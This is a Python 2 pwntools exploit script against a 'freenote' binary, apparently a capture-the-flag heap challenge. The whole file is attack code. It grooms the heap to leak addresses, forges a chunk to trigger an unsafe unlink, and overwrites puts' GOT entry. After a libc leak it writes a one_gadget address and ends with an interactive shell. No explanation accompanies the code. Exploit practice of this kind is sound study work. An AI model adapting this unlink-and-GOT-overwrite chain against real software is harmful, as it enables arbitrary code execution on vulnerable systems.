#!/usr/bin/env python2
from pwn import *
import os

env = {
	'LD_PRELOAD':os.getcwd()+'/libc.so.6_1'
}

elf = ELF('./freenote')
libc = ELF('./libc.so.6_1')

array = 0x06020a8

p = process(['./ld-2.19.so','./freenote'], env = env)
# gdb.attach(p,'handle SIGALRM ignore')

def new_note(note):
	#it calls malloc with atleast 0x80
	p.sendlineafter('Your choice: ', '2')
	p.sendlineafter('Length of new note: ', str(len(note)))
	p.sendafter('Enter your note: ', note)

def edit_note(number,note):
	#uses realloc if current length is not equal to the prev length
	p.sendlineafter('Your choice: ', '3')
	p.sendlineafter('Note number: ',str(number))
	p.sendlineafter('Length of note: ', str(len(note)))
	p.sendafter('Enter your note: ', note)

def delete_note(number):
	p.sendlineafter('Your choice: ', '4')
	p.sendlineafter('Note number: ',str(number))

new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)
new_note('A'*0x100)

delete_note(0)
delete_note(1)

delete_note(3)
delete_note(4)



new_note('A'*0x200) #0 now in the array

new_note('A'*0x200) #1 now in the array


delete_note(6)
delete_note(7)

delete_note(3)


p.sendlineafter('Your choice: ','1') # view the list to get the leak
p.recvuntil('1. ')
heap_leak = p.recvline()[:-1]
heap_leak = u64(heap_leak.ljust(8,'\x00'))
heap_base = heap_leak - 0x1e80

log.success('Heap Base: 0x{:x}'.format(heap_base))

actual_struct_array = heap_base +0x10
target_ptr = actual_struct_array + 0x68


part1 = (p64(0)+p64(0x101)+p64(target_ptr-8*3)+p64(target_ptr-8*2)).ljust(0x100,'A')

payload = part1 +p64(0x100) + p64(0x110) + 'A'*0x80
new_note(payload) # 3 in the array, can be written to
delete_note(7) # deleting the fake chunk to trigger the unlink

payload = p64(0)+p64(1)+p64(8)+p64(elf.got['puts'])
payload=payload.ljust(0x190,'\x00')
edit_note(3,payload)

p.sendlineafter('Your choice: ','1') # view the list to get the leak

p.recvuntil('3. ')
leak = p.recvline()[:-1]
libc.address = u64(leak.ljust(8,'\x00')) - libc.symbols['puts']

log.success('Libc : 0x{:x}'.format(libc.address))

one_gadget = libc.address + 0xe58c5
edit_note(3,p64(one_gadget))

p.interactive()